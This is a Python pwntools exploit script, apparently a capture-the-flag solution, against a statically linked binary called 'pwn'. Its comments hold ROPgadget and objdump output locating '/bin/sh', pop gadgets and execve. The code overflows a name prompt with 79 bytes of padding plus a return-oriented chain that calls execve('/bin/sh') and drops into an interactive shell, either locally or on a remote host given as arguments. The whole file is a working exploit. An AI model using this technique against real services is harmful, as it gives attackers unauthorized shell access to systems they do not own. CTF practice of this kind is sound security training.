# Offset is 79
# Statically linked binary
# I didn't find system so I use execve
"""
$ ROPgadget --binary pwn --string '/bin/sh'      
Strings information
============================================================
0x0000000000498004 : /bin/sh

$ ROPgadget --binary pwn --only 'pop|ret' | grep rdi
0x00000000004049d4 : pop rdi ; pop rbp ; ret
0x0000000000401f2f : pop rdi ; ret

$ ROPgadget --binary pwn --only 'pop|ret' | grep rsi
0x00000000004049d2 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000401f2d : pop rsi ; pop r15 ; ret
0x0000000000409f5e : pop rsi ; ret
                                                                                                                                                    
$ ROPgadget --binary pwn --only 'pop|ret' | grep rdx
0x000000000047f03a : pop rax ; pop rdx ; pop rbx ; ret
0x000000000047f03b : pop rdx ; pop rbx ; ret

$ objdump -D pwn -M intel | grep execve   
  4469dd:       e8 1e c1 02 00          call   472b00 <__execve>
0000000000472b00 <__execve>:
  472b11:       73 01                   jae    472b14 <__execve+0x14>
"""

bin_sh = 0x0000000000498004
pop_rdi_ret = 0x0000000000401F2F
pop_rsi_ret = 0x0000000000409F5E
execve = 0x0000000000472B00
pop_rdx_rbx_ret = 0x000000000047F03B
from pwn import *
import sys

context.log_level = "debug"


if len(sys.argv) == 1:
    r = process("./pwn")
    # gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b"A" * 79
r.recvuntil(b"Show me your name: ")
r.sendline(
    padding
    + p64(pop_rdi_ret)
    + p64(bin_sh)
    + p64(pop_rsi_ret)
    + p64(0)
    + p64(pop_rdx_rbx_ret)
    + p64(0)
    + p64(0)
    + p64(execve)
)
r.recvuntil(b"\x0a")
r.interactive()
